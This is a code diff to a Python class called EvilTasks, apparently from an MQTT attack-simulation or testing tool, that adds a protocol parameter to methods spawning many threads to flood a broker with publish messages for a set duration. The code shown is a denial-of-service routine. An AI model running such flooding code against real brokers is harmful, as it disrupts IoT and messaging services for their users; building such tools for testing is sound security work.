@@ -15,6 +15,7 @@ import time, numpy as np
 import threading
 from Utils.Distributions import Distributions
 from Model.MQTT_handler.MQTT_handler import MQTT_handler	#Forse non serve
+import paho.mqtt.client as mqtt
 
 class EvilTasks:
 	
@@ -190,13 +191,13 @@ class EvilTasks:
 
 
 	#DoS attack task for each thread
-	def DoS_task(self, client_id, config, end_time):
+	def DoS_task(self, client_id, config, end_time, protocol):
 		
 		topic = config["Topic"]
 		qos = int(config["QoS"])
 		payload = config["Payload"]
 		publish_interval = float(config["Period"])
-		publisher = self.MQTT_object.mqtt_register_client(client_id)
+		publisher = self.MQTT_object.mqtt_register_client(client_id, protocol)
 
 		while publisher is not None and time.time() < end_time:
 			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload)
@@ -205,7 +206,7 @@ class EvilTasks:
 
 
 	#Spawn num_clients threads and each one of them makes a DoS_task
-	def DoS_attack(self, config):
+	def DoS_attack(self, config, protocol):
 		
 		num_clients = int(config["NumClients"])
 		duration = float(config["Duration"])
@@ -215,7 +216,7 @@ class EvilTasks:
 		print("Starting DoS")
 
 		for i in range(num_clients):
-			thread = threading.Thread(target=self.DoS_task, args=(f"dos_client_{i}", config, end_time))
+			thread = threading.Thread(target=self.DoS_task, args=(f"dos_client_{i}", config, end_time, protocol))
 			thread.daemon = True
 			self.MQTT_object.working_threads.append(thread)
 			thread.start()
